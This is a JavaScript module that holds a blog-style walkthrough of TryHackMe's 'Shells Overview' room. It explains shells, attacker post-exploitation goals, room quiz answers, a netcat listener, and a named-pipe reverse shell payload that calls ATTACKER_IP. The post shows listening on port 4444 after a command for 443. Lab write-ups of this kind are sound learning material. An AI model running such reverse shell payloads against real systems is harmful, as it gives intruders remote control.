export default {
    id: 'shells-overview',
    title: 'Shells Overview',
    category: 'TryHackMe',
    difficulty: 'Easy',
    tags: ['Shells'],
    date: '2026-02-05T12:00:00',
    excerpt: 'Write up and walkthrough of Shells Overview room on TryHackMe.',
    content: `
This is a write up and walkthrough of the Shells Overview room on TryHackMe.

⸻⸻⸻⸻⸻

### Task 1 Introduction

**Introduction**
Shells in cyber security are widely used by attackers to remotely control systems, making them an important part of the attack chain. In this room, we'll explore different shells used in offensive security, the differences between them, and their use cases. This knowledge can help enhance penetration testing and exploitation skills and also help us understand how to detect when a remote shell is being used by an attacker within an organization.

**Learning Objectives**
In this room, we'll cover the following learning objectives:
    - Understand Shells in Offensive Security 
    - Set Up and Use Reverse and Bind Shells
    - Deploy Web Shells

**Room Prerequisites**
An understanding of the following topics is recommended before starting the room:
    - Basic Understanding of Networking
    - Fundamental Knowledge of Web Application Security
    - Basic Command Line Proficiency
    - Familiarity with scripting languages like Bash, Python, or PHP

**Caveats**
The use of Metasploit or other Frameworks that generate or interact with shells has been intentionally left behind from this room. This is to focus on understanding how shells work without the use or assistance of a tool to either set up or generate a shell. Also, for this room, we'll use Linux OS for all the examples.

⸻⸻⸻⸻⸻

### Task 2 Shell Overview

**What is a Shell?**
A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.

In cyber security, it commonly refers to a specific shell session an attacker uses when accessing a compromised system, allowing them to run commands and execute software. This will allow attackers to execute several activities, some of which are described below.
    - **Remote System Control**: allows the attacker to execute commands or software remotely in the target system.
    - **Privilege Escalation**: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
    - **Data Exfiltration**: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
    - **Persistence and Maintenance Access**: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
    - **Post-Exploitation Activities**: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
    - **Access Other Systems on the Network**: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.
All of the shells we will describe in the next tasks can help to achieve different limitations of the attacks described above.

**Answer the questions below**⸻⸻⸻⸻⸻

What is the command-line interface that allows users to interact with an operating system?
**Answer:** shell

What process involves using a compromised system as a launching pad to attack other machines in the network?
**Answer:** pivoting

What is a common activity attackers perform after obtaining shell access to escalate their privileges?
**Answer:** privilege escalation

⸻⸻⸻⸻⸻

### Task 3 Reverse Shell

**Reverse Shell**
A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

**How Reverse Shells Work**
**Set up a Netcat (nc) Listener**
Let's now understand how a reverse shell works in a practical scenario using the tool Netcat. This utility supports multiple OSs and allows reading and writing through a network.

As mentioned above, a reverse shell will connect back to the attacker's machine. This machine will be waiting for a connection, so let's use Netcat to listen to a connection using the following command \`nc -lvnp 443\`.
\`\`\`
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
\`\`\`

The command above uses the \`-l\` option to indicate Netcat to listen or wait for a connection. The \`-v\` option enables verbose mode. The \`-n\` option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address. Finally, the \`-p\` flag indicates the port that will be used to wait for the connection, in the case above, port **443**.

Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like **53**, **80**, **8080**, **443**, **139**, or **445**. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.

**Gaining Reverse Shell Access**
Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. There's a variety of payloads that will depend on the tools and OS of the compromised system. We can explore some of them <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.

As an example, let's analyze an example payload named a **pipe reverse shell**, as shown below.
\`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f\`



`
}